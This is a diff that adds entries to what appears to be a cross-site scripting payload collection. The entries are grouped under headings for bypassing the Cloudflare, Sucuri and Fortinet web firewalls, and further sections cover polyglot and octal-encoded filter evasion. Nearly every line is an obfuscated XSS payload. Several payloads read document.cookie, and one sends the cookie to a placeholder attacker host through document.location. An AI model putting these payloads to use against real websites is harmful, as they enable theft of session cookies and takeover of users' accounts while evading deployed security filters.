@@ -10,6 +10,26 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--</Title/<​/Style/<
 2ftitLe%2f%26lt%3b%2fteXtarEa%2f%26lt%3b%2fscRipt%2f--!%26gt%3b%5cx3csVg%2f%26lt%3bsVg%2foNloAd%3dconfirm(%27XSS%27)%2f%2f%26gt%3b%5cx3e>
 <a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(document.domain)" />click
 "/hrefd=(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto⁣
+&lt;img longdesc="src='x'onerror=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<math><x xlink:href=javascript:confirm`1`>click
+<img%20src=x%20onerror=”%26%2397%26%23108%26%23101%26%23114%26%23116(1)”>
+"><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
+<noscript><p title="</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()>">
+<Svg%20Only=1%20OnLoad=confirm(atob(%27Q2xvdWRmbGFyZSBieXBhc3NlZA==%27))>
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F 
+<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
+"/hrefd=(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto⁣
+</textarea>a00n<details open="\u0022x="ontoggle="x=atob;z=x('YWxlcnQoJ0EwME4nKQ==');a00n=top;n=`ev`;a00n[n+'al'](z)">
+j%09avascript:document.location=%27http://{attackersite}/%27%2bdocument.cookie
+javascript:top[/al/.source+/ert/.source](document.cookie)
+<img src="X" onerror=top[8680439..toString(30)](1337)>
+<script>top[8680439..toString(30)](1337)</script>
+/#proto[preventDefault]=x&proto[handleObj]=x&proto[delegateTarget]=%3Cimg/src/onerror%3dalert(111)%3E)
+////evil%E3%80%82com = dot
+%22%3E%3Cimg%20src=/%20onerror=alert(xss)%3E
+javascript%3Avar%7Ba%3A%5Cu006f%5Cu006e%5Cu0065%5Cu0072%5Cu0072%5Cu006f%5Cu0072%7D%3D%7Ba%3A%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%7D%3Bthrow%2520\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074.\u0063\u006f\u006f\u006b\u0069\u0065
 
 ##Cloudflare bypass:
 <a href="//e..l.com">XSS</a>
@@ -20,6 +40,8 @@ javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt​&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a> 
 "/hrefd=(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto
 %3Cimg%2Fsrc%2Fonerror%3Dalert%2F%2F%26NewLine%3B%282%29%3E
+onxss=><svg/ONLoad=alert(cookie)+x
+ONxss=><details open ontoggle=prompt(document.domain)+x
 
 ##Sucuri bypass:
 "><input/onauxclick​="[1].map(prompt)">
@@ -34,5 +56,17 @@ javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 
 ##Fortinet:
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
+<img//////src=x oNlY=1 oNerror=alert('xxs')//
+<details open ontoggle="(()=>alert`ibrahimxss`)()"></details>
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+"><body/oNpagEshoW=(confirm)(document.domain)>
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
+<svg onload="alert(1)" <="" svg=""
 
+##XSS Bypass filter using polyglot 
+--><h2></div></div><script>alert(1)</script>
+
+##XSS Bypass filter using Character Encoding with octal escape sequence
+<iframe on only=1 onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\144\157\143\165\155\145\156\164\56\144\157\155\141\151\156\51')()">
+<iframe on only=1 onload="[][ 'filter' ][ 'constructor' ]( 'alert(document.domain)' )()">
 
